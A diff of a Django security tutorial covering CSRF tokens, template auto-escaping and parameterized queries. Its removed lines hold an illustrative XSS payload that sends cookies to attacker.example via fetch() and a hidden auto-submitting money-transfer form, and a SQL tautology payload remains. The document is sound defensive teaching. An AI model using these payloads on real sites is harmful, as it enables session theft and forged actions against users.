@@ -8,6 +8,32 @@ order: 12
 
 > Django provides strong built-in protection against **CSRF**, **XSS**, and **SQL injection**, but these protections work only when we use Django's middleware, template engine, and ORM correctly.
 
+## In short
+
+- `CsrfViewMiddleware` rejects every unsafe method (`POST`, `PUT`, `PATCH`, `DELETE`) unless the submitted token matches the CSRF cookie — `{% csrf_token %}` puts it in a form, the `X-CSRFToken` header carries it for `fetch()`, and a mismatch is a `403`.
+- When the frontend is on another origin, list it in `CSRF_TRUSTED_ORIGINS`; set `CSRF_COOKIE_SECURE = True` in production. `@csrf_exempt` is almost always the wrong fix for a 403 — it is defensible only for a third-party webhook that verifies an HMAC signature instead.
+- Django templates auto-escape every `{{ variable }}`. The only ways to switch that off are `|safe`, `mark_safe()`, and `{% autoescape off %}` — each is a promise that the value is already trusted or sanitized.
+- Auto-escaping is HTML-context only. It does not make a value safe inside a `<script>` block, an unquoted attribute, or a URL — use `json_script` for data JavaScript will read, quote attributes, and allowlist URL schemes.
+- The ORM parameterizes every query, so injection can only enter through `raw()`, `extra()`, `RawSQL`, or a hand-built SQL string — pass values as the `params` argument, never through f-strings, `.format()`, or `%`, and never quote a `%s` placeholder.
+- Identifiers cannot be parameterized. A dynamic table name, column, or sort direction has to be mapped through a server-side allowlist before it reaches the query.
+
+```mermaid
+flowchart LR
+    A[Untrusted User Input] --> B{Where is it used?}
+
+    B -->|State-changing request| C[CSRF Validation]
+    B -->|HTML output| D[Template Escaping]
+    B -->|Database query| E[Query Parameterization]
+
+    C --> F[Protected View]
+    D --> G[Safe Browser Output]
+    E --> H[Safe Database Query]
+```
+
+**Interview answer:** Django answers the three at three different layers. `CsrfViewMiddleware` validates a per-session token on every state-changing request, so a cross-site POST without `{% csrf_token %}` gets a 403; the template engine HTML-escapes every variable by default, so stored input renders as text instead of markup; and the ORM sends the SQL structure and the values to the driver separately, so input is never parsed as SQL. Each defence has exactly one documented off-switch — `@csrf_exempt`, `|safe`/`mark_safe`, and raw or string-formatted SQL — so in practice a Django application is vulnerable only where somebody reached for one of them.
+
+**Gotcha:** Treating auto-escaping as blanket XSS protection. It escapes for HTML text, so `const name = "{{ username }}";` inside a `<script>` tag is still injectable — HTML escaping is not JavaScript-string escaping, and the same gap exists in unquoted attributes and in `href` values that accept a `javascript:` scheme.
+
 ---
 
 # 1. Security Model at a Glance
@@ -38,73 +64,15 @@ Django protects different layers using different mechanisms.
 | Clickjacking | User interface | `XFrameOptionsMiddleware` |
 | Session theft over HTTP | Cookies and authentication | HTTPS and secure cookie settings |
 
-## Security Flow
-
-```mermaid
-flowchart LR
-    A[Untrusted User Input] --> B{Where is it used?}
-
-    B -->|State-changing request| C[CSRF Validation]
-    B -->|HTML output| D[Template Escaping]
-    B -->|Database query| E[Query Parameterization]
-
-    C --> F[Protected View]
-    D --> G[Safe Browser Output]
-    E --> H[Safe Database Query]
-```
-
 Django's built-in protection is not one global security switch. Each protection solves a different problem.
 
 ---
 
 # 2. CSRF Protection
 
-## 2.1 What Is CSRF?
+A cross-site request forgery makes a logged-in user's browser send a state-changing request they did not intend. For the attack mechanics see [SQL Injection, XSS and CSRF](../security/sql-injection-xss-csrf.md); this section covers Django's defences.
 
-**CSRF** stands for **Cross-Site Request Forgery**.
-
-A CSRF attack tricks a logged-in user's browser into sending an unwanted request to a trusted application.
-
-For example, assume a user is logged in to:
-
-```text
-https://bank.example.com
-```
-
-The browser holds the user's session cookie. The user then visits a malicious website containing a hidden form:
-
-```html
-<form action="https://bank.example.com/transfer/" method="POST">
-    <input type="hidden" name="to_account" value="attacker">
-    <input type="hidden" name="amount" value="5000">
-</form>
-
-<script>
-    document.forms[0].submit();
-</script>
-```
-
-The browser may automatically attach the bank's session cookie. Without CSRF protection, the bank could treat the request as a valid request from the logged-in user.
-
-## CSRF Attack Flow
-
-```mermaid
-sequenceDiagram
-    participant U as Logged-in User
-    participant M as Malicious Website
-    participant B as Browser
-    participant D as Django Application
-
-    U->>D: Log in
-    D-->>B: Session cookie
-    U->>M: Visit malicious page
-    M-->>B: Hidden POST form
-    B->>D: POST request + session cookie
-    D->>D: Validate CSRF token
-    D-->>B: 403 Forbidden when token is missing
-```
-
-## 2.2 What CSRF Protection Actually Verifies
+## 2.1 What CSRF Protection Actually Verifies
 
 A session cookie proves:
 
@@ -123,13 +91,9 @@ Django's CSRF protection mainly uses:
 5. Origin checking when the browser sends an `Origin` header.
 6. Strict referer checking for HTTPS requests when `Origin` is unavailable.
 
-For unsafe HTTP methods, Django compares the submitted token with the expected secret. Invalid or missing tokens normally produce:
+For unsafe HTTP methods, Django compares the submitted token with the expected secret. Invalid or missing tokens normally produce: `HTTP 403 Forbidden`
 
-```text
-HTTP 403 Forbidden
-```
-
-## 2.3 Safe and Unsafe HTTP Methods
+## 2.2 Safe and Unsafe HTTP Methods
 
 Django's CSRF protection ignores methods that should not change server state:
 
@@ -156,7 +120,6 @@ from django.contrib.auth.decorators import login_required
 from django.http import HttpResponse
 from django.views.decorators.http import require_POST
 
-
 @login_required
 @require_POST
 def delete_account(request):
@@ -170,7 +133,6 @@ def delete_account(request):
 from django.contrib.auth.decorators import login_required
 from django.http import HttpResponse
 
-
 @login_required
 def delete_account(request):
     # Dangerous: a GET request changes application state.
@@ -182,7 +144,7 @@ A state-changing GET endpoint can be triggered by a link, browser prefetch, craw
 
 ---
 
-## 2.4 CSRF Middleware
+## 2.3 CSRF Middleware
 
 A normal Django project includes CSRF middleware in `settings.py`:
 
@@ -198,17 +160,13 @@ MIDDLEWARE = [
 ]
 ```
 
-The important entry is:
-
-```python
-"django.middleware.csrf.CsrfViewMiddleware"
-```
+The important entry is: `"django.middleware.csrf.CsrfViewMiddleware"`
 
 Keep it enabled unless the application has a carefully designed alternative.
 
 ---
 
-## 2.5 CSRF Token in Django Templates
+## 2.4 CSRF Token in Django Templates
 
 For every internal POST form, include `{% csrf_token %}`:
 
@@ -248,15 +206,11 @@ A CSRF token should not normally be sent to an unrelated external domain.
 
 ---
 
-## 2.6 CSRF with JavaScript and `fetch()`
+## 2.5 CSRF with JavaScript and `fetch()`
 
 For an AJAX request, send the CSRF token in the request header.
 
-Django's default header name is:
-
-```text
-X-CSRFToken
-```
+Django's default header name is: `X-CSRFToken`
 
 ### Template
 
@@ -306,7 +260,7 @@ For cross-origin requests, cookie and CSRF behavior also depends on:
 
 ---
 
-## 2.7 CSRF with Django REST Framework
+## 2.6 CSRF with Django REST Framework
 
 The key distinction is the authentication mechanism.
 
@@ -324,11 +278,7 @@ REST_FRAMEWORK = {
 
 ### Bearer token authentication
 
-A bearer token is normally sent explicitly:
-
-```http
-Authorization: Bearer <access-token>
-```
+A bearer token is normally sent explicitly: `Authorization: Bearer <access-token>`
 
 Traditional CSRF attacks mainly rely on credentials that browsers attach automatically, such as cookies. Therefore, an API using an authorization header instead of cookie-based authentication has a different CSRF risk model.
 
@@ -340,7 +290,7 @@ However:
 
 ---
 
-## 2.8 Trusted Origins
+## 2.7 Trusted Origins
 
 When a trusted frontend is hosted on another origin, configure complete origins:
 
@@ -351,11 +301,7 @@ CSRF_TRUSTED_ORIGINS = [
 ]
 ```
 
-An origin includes:
-
-```text
-scheme + hostname + optional port
-```
+An origin includes: `scheme + hostname + optional port`
 
 Examples:
 
@@ -368,7 +314,7 @@ Do not add broad trusted origins merely to remove CSRF errors. Trust only origin
 
 ---
 
-## 2.9 Secure CSRF Settings for Production
+## 2.8 Secure CSRF Settings for Production
 
 ```python
 CSRF_COOKIE_SECURE = True
@@ -397,23 +343,18 @@ This restricts when the browser sends the cookie in cross-site contexts.
 
 ### `CSRF_COOKIE_HTTPONLY`
 
-Django allows:
-
-```python
-CSRF_COOKIE_HTTPONLY = True
-```
+Django allows: `CSRF_COOKIE_HTTPONLY = True`
 
 However, JavaScript can no longer read the CSRF cookie directly. The token then needs to be rendered into the page using `{% csrf_token %}` or another safe server-rendered mechanism.
 
 ---
 
-## 2.10 `csrf_exempt`
+## 2.9 `csrf_exempt`
 
 Django provides the `csrf_exempt` decorator:
 
 ```python
 from django.views.decorators.csrf import csrf_exempt
-
 
 @csrf_exempt
 def webhook(request):
@@ -442,7 +383,6 @@ from django.http import HttpRequest, HttpResponse, HttpResponseForbidden
 from django.views.decorators.csrf import csrf_exempt
 from django.views.decorators.http import require_POST
 
-
 def valid_signature(*, payload: bytes, provided_signature: str) -> bool:
     expected_signature = hmac.new(
         key=settings.WEBHOOK_SECRET.encode(),
@@ -451,7 +391,6 @@ def valid_signature(*, payload: bytes, provided_signature: str) -> bool:
     ).hexdigest()
 
     return hmac.compare_digest(expected_signature, provided_signature)
-
 
 @csrf_exempt
 @require_POST
@@ -478,7 +417,7 @@ It does not mean:
 
 ---
 
-## 2.11 CSRF Mental Model
+## 2.10 CSRF Mental Model
 
 ```text
 Session Cookie
@@ -498,42 +437,11 @@ HTTPS
 
 # 3. XSS Protection
 
-## 3.1 What Is XSS?
-
-**XSS** stands for **Cross-Site Scripting**.
-
-An XSS attack occurs when untrusted content is interpreted as executable browser code.
-
-Example malicious input:
-
-```html
-<script>
-    fetch("https://attacker.example/steal?cookie=" + document.cookie);
-</script>
-```
-
-If an application stores this value and later renders it as HTML, the script may execute in another user's browser.
-
-## Stored XSS Flow
-
-```mermaid
-sequenceDiagram
-    participant A as Attacker
-    participant D as Django Application
-    participant DB as Database
-    participant V as Victim Browser
-
-    A->>D: Submit malicious comment
-    D->>DB: Store comment
-    V->>D: Open comments page
-    D->>DB: Read malicious comment
-    D-->>V: Render page
-    V->>V: Execute script if output is unsafe
-```
+Cross-site scripting is attacker-controlled input reaching a page as executable markup. The attack mechanics are covered in [SQL Injection, XSS and CSRF](../security/sql-injection-xss-csrf.md); what follows is Django's side of it.
 
 ---
 
-## 3.2 Main XSS Types
+## 3.1 Main XSS Types
 
 ### Stored XSS
 
@@ -551,47 +459,27 @@ Example locations:
 
 The malicious content comes from the current request and is immediately returned in the response.
 
-Example:
-
-```text
-/search/?query=<script>...</script>
-```
+Example: `/search/?query=<script>...</script>`
 
 ### DOM-based XSS
 
 Client-side JavaScript inserts untrusted data into an unsafe browser API.
 
-Example:
-
-```javascript
-element.innerHTML = userInput;
-```
+Example: `element.innerHTML = userInput;`
 
 Django's server-side escaping cannot protect code that becomes unsafe entirely inside browser-side JavaScript.
 
 ---
 
-## 3.3 Django Template Auto-Escaping
+## 3.2 Django Template Auto-Escaping
 
 Django templates enable HTML auto-escaping by default.
 
-Template:
+Template: `<p>{{ comment.text }}</p>`
 
-```html
-<p>{{ comment.text }}</p>
-```
+User input: `<script>alert("XSS")</script>`
 
-User input:
-
-```html
-<script>alert("XSS")</script>
-```
-
-Rendered output is escaped:
-
-```html
-<p>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</p>
-```
+Rendered output is escaped: `<p>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</p>`
 
 The browser displays the string instead of executing it.
 
@@ -616,7 +504,7 @@ Django commonly escapes dangerous HTML characters such as:
 
 ---
 
-## 3.4 Context Matters
+## 3.3 Context Matters
 
 HTML escaping is context-specific. A value that is safe in normal HTML text may not automatically be safe in every possible context.
 
@@ -673,7 +561,6 @@ View:
 ```python
 from django.shortcuts import render
 
-
 def profile(request):
     profile_data = {
         "username": request.user.username,
@@ -689,7 +576,7 @@ def profile(request):
 
 ---
 
-## 3.5 Dangerous Escape Bypasses
+## 3.4 Dangerous Escape Bypasses
 
 ### `safe` filter
 
@@ -703,7 +590,6 @@ This tells Django not to escape the value.
 
 ```python
 from django.utils.safestring import mark_safe
-
 
 html = mark_safe(user_input)
 ```
@@ -722,7 +608,7 @@ They should not be used simply because escaped HTML "does not look right."
 
 ---
 
-## 3.6 Escaping vs Sanitization
+## 3.5 Escaping vs Sanitization
 
 These two concepts are different.
 
@@ -730,17 +616,9 @@ These two concepts are different.
 
 Escaping displays HTML characters as text.
 
-Input:
+Input: `<strong>Hello</strong>`
 
-```html
-<strong>Hello</strong>
-```
-
-Escaped output:
-
-```text
-<strong>Hello</strong>
-```
+Escaped output: `<strong>Hello</strong>`
 
 The tags appear as text.
 
@@ -755,11 +633,7 @@ Input:
 <script>alert("XSS")</script>
 ```
 
-Possible sanitized output:
-
-```html
-<strong>Hello</strong>
-```
+Possible sanitized output: `<strong>Hello</strong>`
 
 Django's template auto-escaping performs escaping. It is not a full HTML sanitizer.
 
@@ -787,13 +661,12 @@ The safest design is to store a structured format such as Markdown or editor JSO
 
 ---
 
-## 3.7 Safe HTML Construction in Python
+## 3.6 Safe HTML Construction in Python
 
 When generating a small HTML fragment, use `format_html()`:
 
 ```python
 from django.utils.html import format_html
-
 
 def user_link(user):
     return format_html(
@@ -810,7 +683,6 @@ Avoid:
 ```python
 from django.utils.safestring import mark_safe
 
-
 def user_link(user):
     return mark_safe(
         f'<a href="/users/{user.pk}/">{user.get_full_name()}</a>'
@@ -821,7 +693,7 @@ In the second example, an unsafe user name can become part of executable HTML.
 
 ---
 
-## 3.8 XSS in Client-Side JavaScript
+## 3.7 XSS in Client-Side JavaScript
 
 Django templates may render the initial page safely, but frontend JavaScript can reintroduce XSS.
 
@@ -850,17 +722,13 @@ https:
 http:
 ```
 
-Reject dangerous schemes such as:
-
-```text
-javascript:
-```
+Reject dangerous schemes such as: `javascript:`
 
 The exact allowlist depends on the feature.
 
 ---
 
-## 3.9 Content Security Policy
+## 3.8 Content Security Policy
 
 Django 6.0 includes built-in Content Security Policy support.
 
@@ -887,7 +755,7 @@ Think of CSP as defense in depth.
 
 ---
 
-## 3.10 XSS Mental Model
+## 3.9 XSS Mental Model
 
 ```mermaid
 flowchart TD
@@ -904,50 +772,11 @@ The main rule is:
 
 # 4. SQL Injection Protection
 
-## 4.1 What Is SQL Injection?
-
-SQL injection occurs when untrusted input changes the structure of a SQL query.
-
-Assume an application constructs SQL like this:
-
-```python
-username = request.GET["username"]
-
-query = (
-    "SELECT * FROM auth_user "
-    f"WHERE username = '{username}'"
-)
-```
-
-An attacker may submit:
-
-```text
-' OR '1'='1
-```
-
-The final SQL becomes conceptually:
-
-```sql
-SELECT *
-FROM auth_user
-WHERE username = '' OR '1'='1';
-```
-
-The user input has become executable SQL syntax.
-
-## SQL Injection Flow
-
-```mermaid
-flowchart LR
-    A[Attacker Input] --> B[String Concatenation]
-    B --> C[SQL Structure Modified]
-    C --> D[Database Executes Attacker Logic]
-    D --> E[Data Leakage or Modification]
-```
+SQL injection is user input becoming part of a SQL statement instead of a value. See [SQL Injection, XSS and CSRF](../security/sql-injection-xss-csrf.md) for how the attack works; this section covers what Django does about it.
 
 ---
 
-## 4.2 Why Django ORM Is Usually Safe
+## 4.1 Why Django ORM Is Usually Safe
 
 Django QuerySets use parameterized queries.
 
@@ -965,11 +794,7 @@ FROM auth_user
 WHERE username = %s;
 ```
 
-And separately:
-
-```text
-parameters = ["' OR '1'='1"]
-```
+And separately: `parameters = ["' OR '1'='1"]`
 
 The database driver treats the value as data rather than SQL code.
 
@@ -988,7 +813,7 @@ Database interpretation:
 
 ---
 
-## 4.3 Safe ORM Examples
+## 4.2 Safe ORM Examples
 
 ### Filtering
 
@@ -1026,13 +851,12 @@ Django's ORM safely parameterizes field values in normal query operations.
 
 ---
 
-## 4.4 Safe Raw SQL
+## 4.3 Safe Raw SQL
 
 Sometimes raw SQL is necessary. Use placeholders and pass values separately.
 
 ```python
 from django.db import connection
-
 
 def find_active_user(email: str):
     with connection.cursor() as cursor:
@@ -1075,7 +899,7 @@ users = User.objects.raw(
 
 ---
 
-## 4.5 Unsafe Raw SQL
+## 4.4 Unsafe Raw SQL
 
 ### f-string interpolation
 
@@ -1108,7 +932,7 @@ All three insert untrusted input into the SQL structure before the database driv
 
 ---
 
-## 4.6 Placeholders Must Not Be Quoted
+## 4.5 Placeholders Must Not Be Quoted
 
 ### Correct
 
@@ -1132,7 +956,7 @@ The database driver is responsible for quoting and escaping the value.
 
 ---
 
-## 4.7 Dynamic Identifiers Need an Allowlist
+## 4.6 Dynamic Identifiers Need an Allowlist
 
 Query parameters can safely represent values, but they normally cannot represent SQL identifiers such as:
 
@@ -1142,11 +966,7 @@ Query parameters can safely represent values, but they normally cannot represent
 - SQL operators
 - SQL keywords
 
-Suppose an API supports sorting:
-
-```text
-/users/?sort=email
-```
+Suppose an API supports sorting: `/users/?sort=email`
 
 Do not directly inject the requested field into raw SQL.
 
@@ -1187,7 +1007,7 @@ The final query component is generated only from known server-side values.
 
 ---
 
-## 4.8 `RawSQL` and Custom Expressions
+## 4.7 `RawSQL` and Custom Expressions
 
 Django provides advanced tools such as:
 
@@ -1201,7 +1021,6 @@ When an expression accepts a separate `params` argument, use it.
 
 ```python
 from django.db.models.expressions import RawSQL
-
 
 products = Product.objects.annotate(
     normalized_score=RawSQL(
@@ -1218,7 +1037,6 @@ Prefer built-in ORM expressions when available:
 ```python
 from django.db.models import F
 
-
 products = Product.objects.annotate(
     normalized_score=F("score") * 1.25
 )
@@ -1228,15 +1046,11 @@ The ORM version is generally easier to maintain and less error-prone.
 
 ---
 
-## 4.9 Input Validation Still Matters
+## 4.8 Input Validation Still Matters
 
 Parameterized SQL prevents SQL injection. It does not ensure that the input is valid for the business requirement.
 
-Example:
-
-```python
-page_size = int(request.GET.get("page_size", "20"))
-```
+Example: `page_size = int(request.GET.get("page_size", "20"))`
 
 Even though this may not create SQL injection, an attacker could request an excessive value.
 
@@ -1244,7 +1058,6 @@ Use validation:
 
 ```python
 from django.core.exceptions import ValidationError
-
 
 def parse_page_size(raw_value: str) -> int:
     try:
@@ -1268,7 +1081,7 @@ Business and resource validation
 
 ---
 
-## 4.10 Least-Privilege Database Access
+## 4.9 Least-Privilege Database Access
 
 Even with safe queries, the production database account should have only the permissions required by the application.
 
@@ -1331,7 +1144,6 @@ This example creates comments safely.
 from django.conf import settings
 from django.db import models
 
-
 class Comment(models.Model):
     author = models.ForeignKey(
         settings.AUTH_USER_MODEL,
@@ -1355,7 +1167,6 @@ class Comment(models.Model):
 from django import forms
 
 from .models import Comment
-
 
 class CommentForm(forms.ModelForm):
     class Meta:
@@ -1394,7 +1205,6 @@ from django.views.decorators.http import require_http_methods
 
 from .forms import CommentForm
 from .models import Comment
-
 
 @login_required
 @require_http_methods(["GET", "POST"])
@@ -1490,19 +1300,11 @@ Comment.objects...
 
 ## 6.5 What Happens with Malicious Input?
 
-Attacker submits:
-
-```html
-<script>alert("XSS")</script>
-```
+Attacker submits: `<script>alert("XSS")</script>`
 
 Django may store that exact text in the database. Storage itself is not necessarily the vulnerability.
 
-The important part is output:
-
-```html
-<p>{{ comment.body }}</p>
-```
+The important part is output: `<p>{{ comment.body }}</p>`
 
 Django escapes it, so the browser displays the text rather than executing it.
 
@@ -1521,7 +1323,6 @@ Django's default test client does not enforce CSRF checks unless requested.
 ```python
 from django.test import Client, TestCase
 from django.urls import reverse
-
 
 class CommentSecurityTests(TestCase):
     def setUp(self):
@@ -1548,7 +1349,6 @@ from django.test import TestCase
 from django.urls import reverse
 
 from .models import Comment
-
 
 class CommentXSSTests(TestCase):
     def test_comment_is_escaped(self):
@@ -1584,7 +1384,6 @@ class CommentXSSTests(TestCase):
 ```python
 from django.contrib.auth import get_user_model
 from django.test import TestCase
-
 
 class UserSearchTests(TestCase):
     def test_search_treats_sql_payload_as_data(self):
@@ -1633,7 +1432,6 @@ Django's built-in protections require correct deployment settings.
 
 ```python
 import os
-
 
 DEBUG = False
 
@@ -1703,11 +1501,7 @@ ALLOWED_HOSTS = [
 
 Django validates the request host against this list.
 
-Avoid:
-
-```python
-ALLOWED_HOSTS = ["*"]
-```
+Avoid: `ALLOWED_HOSTS = ["*"]`
 
 unless the application performs its own strict host validation.
 
@@ -1810,72 +1604,11 @@ Pin dependencies deliberately and use an automated dependency scanner in CI.
 - Run `python manage.py check --deploy`.
 - Keep Django and dependencies supported and patched.
 
----
-
-# 10. Key Takeaways
-
-## CSRF
-
-```text
-Problem:
-    A malicious site sends a state-changing request using a victim's cookies.
-
-Django defense:
-    CSRF cookie + submitted token + middleware + origin checks.
-
-Developer responsibility:
-    Use unsafe HTTP methods for changes, include the token, and avoid unnecessary
-    csrf_exempt usage.
-```
-
-## XSS
-
-```text
-Problem:
-    Untrusted data is interpreted as executable browser code.
-
-Django defense:
-    Template auto-escaping.
-
-Developer responsibility:
-    Do not bypass escaping, use context-safe output, sanitize allowed rich HTML,
-    and keep client-side DOM operations safe.
-```
-
-## SQL Injection
-
-```text
-Problem:
-    User input changes the structure of a SQL statement.
-
-Django defense:
-    ORM and database-driver parameterization.
-
-Developer responsibility:
-    Avoid SQL string construction, parameterize raw SQL, and allowlist dynamic
-    identifiers.
-```
-
-## Final Mental Model
-
-```mermaid
-flowchart TD
-    A[Untrusted Input] --> B{Usage Context}
-
-    B -->|HTTP action| C[Validate CSRF]
-    B -->|HTML or browser output| D[Escape or Sanitize]
-    B -->|Database value| E[Parameterize Query]
-
-    C --> F[Authorized State Change]
-    D --> G[Data Remains Data]
-    E --> H[SQL Structure Remains Fixed]
-```
-
 > Django provides secure defaults, but application security depends on preserving the boundary between **untrusted data** and **executable instructions**.
 
 ---
 
-# 11. Official References
+# 10. Official References
 
 - Django security overview:  
   <https://docs.djangoproject.com/en/6.0/topics/security/>
